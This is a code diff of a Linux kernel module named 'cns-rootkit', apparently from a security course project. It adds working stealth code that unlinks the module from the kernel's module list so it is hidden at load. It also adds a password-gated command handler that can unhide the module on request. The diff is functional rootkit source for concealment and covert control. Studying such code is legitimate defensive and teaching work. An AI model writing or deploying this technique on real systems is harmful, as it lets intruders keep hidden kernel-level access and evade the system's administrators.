@@ -100,9 +100,9 @@ void command_execute(char __user *buf, size_t count) {
   if(count <= sizeof(PASSWORD)) {
     printk(KERN_INFO "cns-rootkit: Command is too small %lu\n", sizeof(PASSWORD));
     return;
-  } 
-  
-  if(strncmp(buf, PASSWORD, sizeof(PASSWORD) - 1) != 0) { 
+  }
+
+  if(strncmp(buf, PASSWORD, sizeof(PASSWORD) - 1) != 0) {
     printk(KERN_INFO "cns-rootkit: Password failed %d\n", strncmp(buf, PASSWORD, sizeof(PASSWORD)));
     return;
   }
@@ -114,6 +114,7 @@ void command_execute(char __user *buf, size_t count) {
   if(strncmp(buf, CMD1, sizeof(CMD1) - 1) == 0) {
     printk(KERN_INFO "cns-rootkit: got command1\n");
     // call some function here
+    cns_rootkit_unhide();
   } else {
     printk(KERN_INFO "cns-rootkit: got unknown command\n");
   }
@@ -150,9 +151,38 @@ int unestablish_comm_channel(void) {
   return 0;
 }
 
+struct list_head *module_list;
+int is_hidden = 0;
+
+void cns_rootkit_hide(void)
+{
+    if (is_hidden) {
+        return;
+    }
+
+    module_list = THIS_MODULE->list.prev;
+
+    list_del(&THIS_MODULE->list);
+
+    is_hidden = 1;
+}
+
+
+void cns_rootkit_unhide(void)
+{
+    if (!is_hidden) {
+        return;
+    }
+
+    list_add(&THIS_MODULE->list, module_list);
+
+    is_hidden = 0;
+}
+
+
 static int cns_rootkit_init(void) {
   printk(KERN_INFO "cns-rootkit: Init\n");
-
+  cns_rootkit_hide();
   if(establish_comm_channel() < 0) {
     printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
   }
